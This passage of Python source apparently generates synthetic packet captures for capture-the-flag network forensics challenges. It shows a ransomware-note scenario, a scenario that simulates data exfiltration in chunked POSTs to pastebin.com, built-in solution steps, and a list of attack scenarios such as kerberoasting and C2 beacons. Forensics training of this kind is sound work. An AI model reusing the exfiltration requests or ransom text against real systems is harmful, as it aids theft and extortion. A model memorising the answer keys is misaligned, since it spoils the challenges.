            b"Personal ID: " + enc.encode() + b"\r\n"
            b"Contact: recovery_help@protonmail.com within 72 hours.\r\n"
            b"Tor portal: http://decrypt" + ("%08x" % rng.getrandbits(32)).encode()
            + b".onion/\r\n")
    req = (f"GET /READ_ME_DECRYPT.txt HTTP/1.1\r\nHost: {server.name}\r\n"
           f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp = _http_response(rng, server.name, path="/READ_ME_DECRYPT.txt",
                          ctype="text/plain", body=note, set_cookie=False, gzip_ok=False)
    sess = tcp_session(net, client, server, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
    res.packets += sess
    for p in sess:
        if p.haslayer(Raw) and b"Personal ID:" in bytes(p[Raw].load):
            res.mark(p, "Ransom note (READ_ME_DECRYPT.txt); flag is the 'Personal ID'")
            break
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot the ransom note fetched by {client.ip} (READ_ME_DECRYPT.txt) - text "
        f"mentioning AES-256, Bitcoin, and a .onion portal.",
        "The note's 'Personal ID:' field is the encoded flag.",
        f"Take the Personal ID and {tail}.",
    ]
    return res


def scenario_pastebin_exfil(flag, rng, clock, cfg, scheme, xor_key, net):
    """Data is exfiltrated to a paste service across several POSTs - a 'dead drop'.
    The encoded flag is split into indexed chunks; reassemble them in order."""
    enc = (encode_payload(flag, "base64", xor_key) if scheme == "none"
           else encode_payload(flag, scheme, xor_key))
    client = rng.choice(net.clients)
    paste = Host("104.20.3.235", net.gateway.mac, "server", "pastebin.com")
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()
    nchunks = rng.randint(3, 5)
    size = (len(enc) + nchunks - 1) // nchunks
    chunks = [enc[i:i + size] for i in range(0, len(enc), size)]
    for idx, ch in enumerate(chunks):
        body = (f"api_dev_key=8f3c2&api_option=paste&paste_private=1&"
                f"paste_idx={idx}&paste_data={ch.decode()}").encode()
        req = (f"POST /api/api_post.php HTTP/1.1\r\nHost: {paste.name}\r\n"
               f"User-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\n\r\n").encode() + body
        resp = _http_response(rng, paste.name, path="/api/api_post.php",
                              ctype="text/plain",
                              body=f"https://pastebin.com/{rng.getrandbits(32):08x}".encode(),
                              set_cookie=False, gzip_ok=False)
        sess = tcp_session(net, client, paste, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
        res.packets += sess
        for p in sess:
            if p.haslayer(Raw) and b"paste_data=" in bytes(p[Raw].load):
                res.mark(p, f"Paste dead-drop POST chunk #{idx}")
                break
        clock[0] += abs(rng.gauss(0.3, 0.1)) + 0.05
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot the dead-drop exfil: {client.ip} makes {len(chunks)} POSTs to the paste "
        f"service {paste.name} ({paste.ip}).",
        "Each POST body has paste_idx=N and paste_data=<chunk>; sort by idx and "
        "concatenate the chunks.",
        f"Then {tail} to recover the flag.",
    ]
    return res


_SCENARIOS = {
    "kerberoast": scenario_kerberoast,
    "ftp-creds": scenario_ftp_creds,
    "telnet-creds": scenario_telnet_creds,
    "http-basic": scenario_http_basic,
    "arp-spoof": scenario_arp_spoof,
    "port-scan": scenario_port_scan,
    "brute-force": scenario_brute_force,
    "c2-beacon": scenario_c2_beacon,
    "rogue-dhcp": scenario_rogue_dhcp,
    "ssdp-upnp": scenario_ssdp_upnp,
    "doh-beacon": scenario_doh_beacon,
    "dga-beacon": scenario_dga_beacon,
    "malware-chain": scenario_malware_chain,
    "ransomware-note": scenario_ransomware_note,
    "pastebin-exfil": scenario_pastebin_exfil,
}
